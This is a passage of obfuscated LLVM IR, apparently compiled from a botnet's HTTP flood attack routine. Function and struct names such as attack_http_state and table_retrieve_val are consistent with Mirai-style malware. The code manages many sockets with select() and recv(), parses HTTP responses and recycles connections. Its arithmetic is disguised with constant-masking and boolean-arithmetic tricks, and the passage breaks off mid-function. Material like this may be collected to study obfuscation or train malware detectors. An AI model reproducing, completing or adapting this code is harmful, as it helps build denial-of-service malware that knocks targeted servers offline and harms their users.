  %923 = sdiv i32 %922, 64
  %924 = sext i32 %923 to i64
  %925 = getelementptr inbounds [16 x i64], [16 x i64]* %919, i64 0, i64 %924
  %926 = load i64, i64* %925, align 8
  %927 = and i64 %926, %918
  %928 = xor i64 %926, %918
  %929 = or i64 %927, %928
  %930 = or i64 %926, %918
  store i64 %929, i64* %925, align 8
  %931 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %932 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %931, i32 0, i32 0
  %933 = load i32, i32* %932, align 4
  %934 = load i32, i32* %23, align 4
  %935 = icmp sgt i32 %933, %934
  br i1 %935, label %936, label %944

; <label>:936:                                    ; preds = %912
  %937 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %938 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %937, i32 0, i32 0
  %939 = load i32, i32* %938, align 4
  %940 = add i32 %939, 746631893
  %941 = add i32 %940, 1
  %942 = sub i32 %941, 746631893
  %943 = add nsw i32 %939, 1
  store i32 %942, i32* %23, align 4
  br label %944

; <label>:944:                                    ; preds = %936, %912
  br label %1023

; <label>:945:                                    ; preds = %906
  %946 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %947 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %946, i32 0, i32 1
  %948 = load i8, i8* %947, align 4
  %949 = zext i8 %948 to i32
  %950 = icmp eq i32 %949, 10
  br i1 %950, label %951, label %997

; <label>:951:                                    ; preds = %945
  %952 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %953 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %952, i32 0, i32 0
  %954 = load i32, i32* %953, align 4
  %955 = srem i32 %954, 64
  %956 = zext i32 %955 to i64
  %957 = shl i64 1, %956
  %958 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %959 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %960 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %959, i32 0, i32 0
  %961 = load i32, i32* %960, align 4
  %962 = sdiv i32 %961, 64
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds [16 x i64], [16 x i64]* %958, i64 0, i64 %963
  %965 = load i64, i64* %964, align 8
  %966 = xor i64 %965, -1
  %967 = xor i64 %957, -1
  %968 = xor i64 2648164728143878284, -1
  %969 = and i64 %966, 2648164728143878284
  %970 = and i64 %965, %968
  %971 = and i64 %967, 2648164728143878284
  %972 = and i64 %957, %968
  %973 = or i64 %969, %970
  %974 = or i64 %971, %972
  %975 = xor i64 %973, %974
  %976 = or i64 %966, %967
  %977 = xor i64 %976, -1
  %978 = or i64 2648164728143878284, %968
  %979 = and i64 %977, %978
  %980 = or i64 %975, %979
  %981 = or i64 %965, %957
  store i64 %980, i64* %964, align 8
  %982 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %983 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %982, i32 0, i32 0
  %984 = load i32, i32* %983, align 4
  %985 = load i32, i32* %23, align 4
  %986 = icmp sgt i32 %984, %985
  br i1 %986, label %987, label %996

; <label>:987:                                    ; preds = %951
  %988 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %989 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %988, i32 0, i32 0
  %990 = load i32, i32* %989, align 4
  %991 = sub i32 0, %990
  %992 = sub i32 0, 1
  %993 = add i32 %991, %992
  %994 = sub i32 0, %993
  %995 = add nsw i32 %990, 1
  store i32 %994, i32* %23, align 4
  br label %996

; <label>:996:                                    ; preds = %987, %951
  br label %1022

; <label>:997:                                    ; preds = %945
  %998 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %999 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %998, i32 0, i32 1
  %1000 = load i8, i8* %999, align 4
  %1001 = zext i8 %1000 to i32
  %1002 = icmp eq i32 %1001, 11
  br i1 %1002, label %1003, label %1012

; <label>:1003:                                   ; preds = %997
  %1004 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1005 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1004, i32 0, i32 1
  store i8 0, i8* %1005, align 4
  %1006 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1007 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1006, i32 0, i32 0
  %1008 = load i32, i32* %1007, align 4
  %1009 = call i32 @close(i32 %1008)
  %1010 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1011 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1010, i32 0, i32 0
  store i32 -1, i32* %1011, align 4
  br label %1021

; <label>:1012:                                   ; preds = %997
  %1013 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1014 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1013, i32 0, i32 1
  store i8 0, i8* %1014, align 4
  %1015 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1016 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1015, i32 0, i32 0
  %1017 = load i32, i32* %1016, align 4
  %1018 = call i32 @close(i32 %1017)
  %1019 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1020 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1019, i32 0, i32 0
  store i32 -1, i32* %1020, align 4
  br label %1021

; <label>:1021:                                   ; preds = %1012, %1003
  br label %1022

; <label>:1022:                                   ; preds = %1021, %996
  br label %1023

; <label>:1023:                                   ; preds = %1022, %944
  br label %1024

; <label>:1024:                                   ; preds = %1023, %905
  br label %1025

; <label>:1025:                                   ; preds = %1024, %865
  br label %1026

; <label>:1026:                                   ; preds = %1025, %563
  br label %1027

; <label>:1027:                                   ; preds = %1026, %506
  br label %1028

; <label>:1028:                                   ; preds = %1027, %523, %433
  %1029 = load i32, i32* %9, align 4
  %1030 = sub i32 0, %1029
  %1031 = sub i32 0, 1
  %1032 = add i32 %1030, %1031
  %1033 = sub i32 0, %1032
  %1034 = add nsw i32 %1029, 1
  store i32 %1033, i32* %9, align 4
  br label %385

; <label>:1035:                                   ; preds = %385
  %1036 = load i32, i32* %23, align 4
  %1037 = icmp eq i32 %1036, 0
  br i1 %1037, label %1038, label %1039

; <label>:1038:                                   ; preds = %1035
  br label %362

; <label>:1039:                                   ; preds = %1035
  %1040 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1040, align 8
  %1041 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1041, align 8
  %1042 = load i32, i32* %23, align 4
  %1043 = call i32 @select(i32 %1042, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1043, i32* %24, align 4
  %1044 = call i64 @time(i64* null) #6
  %1045 = trunc i64 %1044 to i32
  store i32 %1045, i32* %27, align 4
  %1046 = load i32, i32* %24, align 4
  %1047 = icmp slt i32 %1046, 1
  br i1 %1047, label %1048, label %1049

; <label>:1048:                                   ; preds = %1039
  br label %362

; <label>:1049:                                   ; preds = %1039
  store i32 0, i32* %9, align 4
  br label %1050

; <label>:1050:                                   ; preds = %2775, %1049
  %1051 = load i32, i32* %9, align 4
  %1052 = load i32, i32* %18, align 4
  %1053 = icmp slt i32 %1051, %1052
  br i1 %1053, label %1054, label %2781

; <label>:1054:                                   ; preds = %1050
  %1055 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1056 = load i32, i32* %9, align 4
  %1057 = sext i32 %1056 to i64
  %1058 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1055, i64 %1057
  store %struct.attack_http_state* %1058, %struct.attack_http_state** %26, align 8
  %1059 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1060 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1059, i32 0, i32 0
  %1061 = load i32, i32* %1060, align 4
  %1062 = icmp eq i32 %1061, -1
  br i1 %1062, label %1063, label %1064

; <label>:1063:                                   ; preds = %1054
  br label %2775

; <label>:1064:                                   ; preds = %1054
  %1065 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1066 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1067 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1066, i32 0, i32 0
  %1068 = load i32, i32* %1067, align 4
  %1069 = sdiv i32 %1068, 64
  %1070 = sext i32 %1069 to i64
  %1071 = getelementptr inbounds [16 x i64], [16 x i64]* %1065, i64 0, i64 %1070
  %1072 = load i64, i64* %1071, align 8
  %1073 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1074 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1073, i32 0, i32 0
  %1075 = load i32, i32* %1074, align 4
  %1076 = srem i32 %1075, 64
  %1077 = zext i32 %1076 to i64
  %1078 = shl i64 1, %1077
  %1079 = xor i64 %1078, -1
  %1080 = xor i64 %1072, %1079
  %1081 = and i64 %1080, %1072
  %1082 = and i64 %1072, %1078
  %1083 = icmp ne i64 %1081, 0
  br i1 %1083, label %1084, label %1108

; <label>:1084:                                   ; preds = %1064
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1085 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1086 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1085, i32 0, i32 0
  %1087 = load i32, i32* %1086, align 4
  %1088 = bitcast i32* %35 to i8*
  %1089 = call i32 @getsockopt(i32 %1087, i32 1, i32 4, i8* %1088, i32* %36) #6
  store i32 %1089, i32* %12, align 4
  %1090 = load i32, i32* %35, align 4
  %1091 = icmp eq i32 %1090, 0
  br i1 %1091, label %1092, label %1098

; <label>:1092:                                   ; preds = %1084
  %1093 = load i32, i32* %12, align 4
  %1094 = icmp eq i32 %1093, 0
  br i1 %1094, label %1095, label %1098

; <label>:1095:                                   ; preds = %1092
  %1096 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1097 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1096, i32 0, i32 1
  store i8 4, i8* %1097, align 4
  br label %1107

; <label>:1098:                                   ; preds = %1092, %1084
  %1099 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1100 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1099, i32 0, i32 0
  %1101 = load i32, i32* %1100, align 4
  %1102 = call i32 @close(i32 %1101)
  %1103 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1104 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1103, i32 0, i32 0
  store i32 -1, i32* %1104, align 4
  %1105 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1106 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1105, i32 0, i32 1
  store i8 0, i8* %1106, align 4
  br label %2775

; <label>:1107:                                   ; preds = %1095
  br label %1108

; <label>:1108:                                   ; preds = %1107, %1064
  %1109 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1110 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1111 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1110, i32 0, i32 0
  %1112 = load i32, i32* %1111, align 4
  %1113 = sdiv i32 %1112, 64
  %1114 = sext i32 %1113 to i64
  %1115 = getelementptr inbounds [16 x i64], [16 x i64]* %1109, i64 0, i64 %1114
  %1116 = load i64, i64* %1115, align 8
  %1117 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1118 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1117, i32 0, i32 0
  %1119 = load i32, i32* %1118, align 4
  %1120 = srem i32 %1119, 64
  %1121 = zext i32 %1120 to i64
  %1122 = shl i64 1, %1121
  %1123 = xor i64 %1116, -1
  %1124 = xor i64 %1122, -1
  %1125 = xor i64 7531536278073931435, -1
  %1126 = or i64 %1123, %1124
  %1127 = or i64 7531536278073931435, %1125
  %1128 = xor i64 %1126, -1
  %1129 = and i64 %1128, %1127
  %1130 = and i64 %1116, %1122
  %1131 = icmp ne i64 %1129, 0
  br i1 %1131, label %1132, label %2774

; <label>:1132:                                   ; preds = %1108
  %1133 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1134 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1133, i32 0, i32 1
  %1135 = load i8, i8* %1134, align 4
  %1136 = zext i8 %1135 to i32
  %1137 = icmp eq i32 %1136, 6
  br i1 %1137, label %1138, label %2290

; <label>:1138:                                   ; preds = %1132
  store i32 0, i32* %37, align 4
  %1139 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1139, i32 10240)
  %1140 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1141 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1140, i32 0, i32 0
  %1142 = load i32, i32* %1141, align 4
  %1143 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1144 = call i64 @recv(i32 %1142, i8* %1143, i64 10240, i32 16386)
  %1145 = trunc i64 %1144 to i32
  store i32 %1145, i32* %12, align 4
  %1146 = icmp slt i32 %1145, 1
  br i1 %1146, label %1147, label %1156

; <label>:1147:                                   ; preds = %1138
  %1148 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1149 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1148, i32 0, i32 0
  %1150 = load i32, i32* %1149, align 4
  %1151 = call i32 @close(i32 %1150)
  %1152 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1153 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1152, i32 0, i32 0
  store i32 -1, i32* %1153, align 4
  %1154 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1155 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1154, i32 0, i32 1
  store i8 0, i8* %1155, align 4
  br label %2775

; <label>:1156:                                   ; preds = %1138
  %1157 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1158 = load i32, i32* %12, align 4
  %1159 = call i32 @util_memsearch(i8* %1157, i32 %1158, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1160 = icmp eq i32 %1159, -1
  br i1 %1160, label %1161, label %1165

; <label>:1161:                                   ; preds = %1156
  %1162 = load i32, i32* %12, align 4
  %1163 = icmp slt i32 %1162, 10240
  br i1 %1163, label %1164, label %1165

; <label>:1164:                                   ; preds = %1161
  br label %2775

; <label>:1165:                                   ; preds = %1161, %1156
  %1166 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1167 = load i32, i32* %12, align 4
  %1168 = call i32 @util_memsearch(i8* %1166, i32 %1167, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1169 = sext i32 %1168 to i64
  %1170 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1169
  store i8 0, i8* %1170, align 1
  %1171 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1172 = load i32, i32* %12, align 4
  %1173 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1174 = call i32 @util_stristr(i8* %1171, i32 %1172, i8* %1173)
  %1175 = icmp ne i32 %1174, -1
  br i1 %1175, label %1176, label %1179

; <label>:1176:                                   ; preds = %1165
  %1177 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1178 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1177, i32 0, i32 11
  store i32 2, i32* %1178, align 4
  br label %1179

; <label>:1179:                                   ; preds = %1176, %1165
  %1180 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1181 = load i32, i32* %12, align 4
  %1182 = call i8* @table_retrieve_val(i32 52, i32* null)
  %1183 = call i32 @util_stristr(i8* %1180, i32 %1181, i8* %1182)
  %1184 = icmp ne i32 %1183, -1
  br i1 %1184, label %1185, label %1188

; <label>:1185:                                   ; preds = %1179
  %1186 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1186, i32 0, i32 11
  store i32 1, i32* %1187, align 4
  br label %1188

; <label>:1188:                                   ; preds = %1185, %1179
  %1189 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1190 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1189, i32 0, i32 12
  store i32 0, i32* %1190, align 4
  %1191 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1192 = load i32, i32* %12, align 4
  %1193 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1194 = call i32 @util_stristr(i8* %1191, i32 %1192, i8* %1193)
  %1195 = icmp ne i32 %1194, -1
  br i1 %1195, label %1196, label %1257

; <label>:1196:                                   ; preds = %1188
  %1197 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1198 = load i32, i32* %12, align 4
  %1199 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1200 = call i32 @util_stristr(i8* %1197, i32 %1198, i8* %1199)
  store i32 %1200, i32* %38, align 4
  %1201 = load i32, i32* %38, align 4
  %1202 = sext i32 %1201 to i64
  %1203 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1202
  %1204 = load i8, i8* %1203, align 1
  %1205 = sext i8 %1204 to i32
  %1206 = icmp eq i32 %1205, 32
  br i1 %1206, label %1207, label %1212

; <label>:1207:                                   ; preds = %1196
  %1208 = load i32, i32* %38, align 4
  %1209 = sub i32 0, 1
  %1210 = sub i32 %1208, %1209
  %1211 = add nsw i32 %1208, 1
  store i32 %1210, i32* %38, align 4
  br label %1212

; <label>:1212:                                   ; preds = %1207, %1196
  %1213 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1214 = load i32, i32* %38, align 4
  %1215 = sext i32 %1214 to i64
  %1216 = getelementptr inbounds i8, i8* %1213, i64 %1215
  %1217 = load i32, i32* %12, align 4
  %1218 = load i32, i32* %38, align 4
  %1219 = add i32 %1217, 1812139893
  %1220 = sub i32 %1219, %1218
  %1221 = sub i32 %1220, 1812139893
  %1222 = sub nsw i32 %1217, %1218
  %1223 = call i32 @util_memsearch(i8* %1216, i32 %1221, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1223, i32* %39, align 4
  %1224 = load i32, i32* %39, align 4
  %1225 = icmp ne i32 %1224, -1
  br i1 %1225, label %1226, label %1256

; <label>:1226:                                   ; preds = %1212
  %1227 = load i32, i32* %38, align 4
  %1228 = sext i32 %1227 to i64
  %1229 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1228
  store i8* %1229, i8** %40, align 8
  %1230 = load i32, i32* %39, align 4
  %1231 = icmp sge i32 %1230, 2
  br i1 %1231, label %1232, label %1237

; <label>:1232:                                   ; preds = %1226
  %1233 = load i32, i32* %39, align 4
  %1234 = sub i32 0, 2
  %1235 = add i32 %1233, %1234
  %1236 = sub nsw i32 %1233, 2
  store i32 %1235, i32* %39, align 4
  br label %1237

; <label>:1237:                                   ; preds = %1232, %1226
  %1238 = load i32, i32* %38, align 4
  %1239 = load i32, i32* %39, align 4
  %1240 = add i32 %1238, -653198715
  %1241 = add i32 %1240, %1239
  %1242 = sub i32 %1241, -653198715
  %1243 = add nsw i32 %1238, %1239
  %1244 = sext i32 %1242 to i64
  %1245 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1244
  store i8 0, i8* %1245, align 1
  %1246 = load i8*, i8** %40, align 8
  %1247 = load i8*, i8** %40, align 8
  %1248 = call i32 @util_strlen(i8* %1247)
  %1249 = call i8* @table_retrieve_val(i32 50, i32* null)
  %1250 = call i32 @util_stristr(i8* %1246, i32 %1248, i8* %1249)
  %1251 = icmp ne i32 %1250, 0
  br i1 %1251, label %1252, label %1255

; <label>:1252:                                   ; preds = %1237
  %1253 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1253, i32 0, i32 12
  store i32 1, i32* %1254, align 4
  br label %1255

; <label>:1255:                                   ; preds = %1252, %1237
  br label %1256

; <label>:1256:                                   ; preds = %1255, %1212
  br label %1257

; <label>:1257:                                   ; preds = %1256, %1188
  %1258 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1259 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1258, i32 0, i32 13
  store i32 0, i32* %1259, align 4
  %1260 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1261 = load i32, i32* %12, align 4
  %1262 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1263 = call i32 @util_stristr(i8* %1260, i32 %1261, i8* %1262)
  %1264 = icmp ne i32 %1263, -1
  br i1 %1264, label %1265, label %1328

; <label>:1265:                                   ; preds = %1257
  %1266 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1267 = load i32, i32* %12, align 4
  %1268 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1269 = call i32 @util_stristr(i8* %1266, i32 %1267, i8* %1268)
  store i32 %1269, i32* %41, align 4
  %1270 = load i32, i32* %41, align 4
  %1271 = sext i32 %1270 to i64
  %1272 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1271
  %1273 = load i8, i8* %1272, align 1
  %1274 = sext i8 %1273 to i32
  %1275 = icmp eq i32 %1274, 32
  br i1 %1275, label %1276, label %1282

; <label>:1276:                                   ; preds = %1265
  %1277 = load i32, i32* %41, align 4
  %1278 = add i32 %1277, -1822249654
  %1279 = add i32 %1278, 1
  %1280 = sub i32 %1279, -1822249654
  %1281 = add nsw i32 %1277, 1
  store i32 %1280, i32* %41, align 4
  br label %1282

; <label>:1282:                                   ; preds = %1276, %1265
  %1283 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1284 = load i32, i32* %41, align 4
  %1285 = sext i32 %1284 to i64
  %1286 = getelementptr inbounds i8, i8* %1283, i64 %1285
  %1287 = load i32, i32* %12, align 4
  %1288 = load i32, i32* %41, align 4
  %1289 = sub i32 0, %1288
  %1290 = add i32 %1287, %1289
  %1291 = sub nsw i32 %1287, %1288
  %1292 = call i32 @util_memsearch(i8* %1286, i32 %1290, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1292, i32* %42, align 4
  %1293 = load i32, i32* %42, align 4
  %1294 = icmp ne i32 %1293, -1
  br i1 %1294, label %1295, label %1327

; <label>:1295:                                   ; preds = %1282
  %1296 = load i32, i32* %41, align 4
  %1297 = sext i32 %1296 to i64
  %1298 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1297
  store i8* %1298, i8** %43, align 8
  %1299 = load i32, i32* %42, align 4
  %1300 = icmp sge i32 %1299, 2
  br i1 %1300, label %1301, label %1307

; <label>:1301:                                   ; preds = %1295
  %1302 = load i32, i32* %42, align 4
  %1303 = sub i32 %1302, -1147488307
  %1304 = sub i32 %1303, 2
  %1305 = add i32 %1304, -1147488307
  %1306 = sub nsw i32 %1302, 2
  store i32 %1305, i32* %42, align 4
  br label %1307

; <label>:1307:                                   ; preds = %1301, %1295
  %1308 = load i32, i32* %41, align 4
  %1309 = load i32, i32* %42, align 4
  %1310 = sub i32 0, %1308
  %1311 = sub i32 0, %1309
  %1312 = add i32 %1310, %1311
  %1313 = sub i32 0, %1312
  %1314 = add nsw i32 %1308, %1309
  %1315 = sext i32 %1313 to i64
  %1316 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1315
  store i8 0, i8* %1316, align 1
  %1317 = load i8*, i8** %43, align 8
  %1318 = load i8*, i8** %43, align 8
  %1319 = call i32 @util_strlen(i8* %1318)
  %1320 = call i8* @table_retrieve_val(i32 49, i32* null)
  %1321 = call i32 @util_stristr(i8* %1317, i32 %1319, i8* %1320)
  %1322 = icmp ne i32 %1321, 0
  br i1 %1322, label %1323, label %1326

; <label>:1323:                                   ; preds = %1307
  %1324 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1325 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1324, i32 0, i32 13
  store i32 1, i32* %1325, align 4
  br label %1326

; <label>:1326:                                   ; preds = %1323, %1307
  br label %1327

; <label>:1327:                                   ; preds = %1326, %1282
  br label %1328

; <label>:1328:                                   ; preds = %1327, %1257
  %1329 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1330 = load i32, i32* %12, align 4
  %1331 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1332 = call i32 @util_stristr(i8* %1329, i32 %1330, i8* %1331)
  %1333 = icmp ne i32 %1332, -1
  br i1 %1333, label %1334, label %1389

; <label>:1334:                                   ; preds = %1328
  %1335 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1336 = load i32, i32* %12, align 4
  %1337 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1338 = call i32 @util_stristr(i8* %1335, i32 %1336, i8* %1337)
  store i32 %1338, i32* %44, align 4
  %1339 = load i32, i32* %44, align 4
  %1340 = sext i32 %1339 to i64
  %1341 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1340
  %1342 = load i8, i8* %1341, align 1
  %1343 = sext i8 %1342 to i32
  %1344 = icmp eq i32 %1343, 32
  br i1 %1344, label %1345, label %1350

; <label>:1345:                                   ; preds = %1334
  %1346 = load i32, i32* %44, align 4
  %1347 = sub i32 0, 1
  %1348 = sub i32 %1346, %1347
  %1349 = add nsw i32 %1346, 1
  store i32 %1348, i32* %44, align 4
  br label %1350

; <label>:1350:                                   ; preds = %1345, %1334
  %1351 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1352 = load i32, i32* %44, align 4
  %1353 = sext i32 %1352 to i64
  %1354 = getelementptr inbounds i8, i8* %1351, i64 %1353
  %1355 = load i32, i32* %12, align 4
  %1356 = load i32, i32* %44, align 4
  %1357 = sub i32 0, %1356
  %1358 = add i32 %1355, %1357
  %1359 = sub nsw i32 %1355, %1356
  %1360 = call i32 @util_memsearch(i8* %1354, i32 %1358, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1360, i32* %45, align 4
  %1361 = load i32, i32* %45, align 4
  %1362 = icmp ne i32 %1361, -1
  br i1 %1362, label %1363, label %1388

; <label>:1363:                                   ; preds = %1350
  %1364 = load i32, i32* %44, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1365
  store i8* %1366, i8** %46, align 8
  %1367 = load i32, i32* %45, align 4
  %1368 = icmp sge i32 %1367, 2
  br i1 %1368, label %1369, label %1375

; <label>:1369:                                   ; preds = %1363
  %1370 = load i32, i32* %45, align 4
  %1371 = add i32 %1370, 1743791642
  %1372 = sub i32 %1371, 2
  %1373 = sub i32 %1372, 1743791642
  %1374 = sub nsw i32 %1370, 2
  store i32 %1373, i32* %45, align 4
  br label %1375

; <label>:1375:                                   ; preds = %1369, %1363
  %1376 = load i32, i32* %44, align 4
  %1377 = load i32, i32* %45, align 4
  %1378 = add i32 %1376, 22361651
  %1379 = add i32 %1378, %1377
  %1380 = sub i32 %1379, 22361651
  %1381 = add nsw i32 %1376, %1377
  %1382 = sext i32 %1380 to i64
  %1383 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1382
  store i8 0, i8* %1383, align 1
  %1384 = load i8*, i8** %46, align 8
  %1385 = call i32 @util_atoi(i8* %1384, i32 10)
  %1386 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1386, i32 0, i32 14
  store i32 %1385, i32* %1387, align 4
  br label %1388

; <label>:1388:                                   ; preds = %1375, %1350
  br label %1392

; <label>:1389:                                   ; preds = %1328
  %1390 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1391 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1390, i32 0, i32 14
  store i32 0, i32* %1391, align 4
  br label %1392

; <label>:1392:                                   ; preds = %1389, %1388
  store i32 0, i32* %37, align 4
  br label %1393

; <label>:1393:                                   ; preds = %1616, %1392
  %1394 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1395 = load i32, i32* %37, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds i8, i8* %1394, i64 %1396
  %1398 = load i32, i32* %12, align 4
  %1399 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1400 = call i32 @util_stristr(i8* %1397, i32 %1398, i8* %1399)
  %1401 = icmp ne i32 %1400, -1
  br i1 %1401, label %1402, label %1407

; <label>:1402:                                   ; preds = %1393
  %1403 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
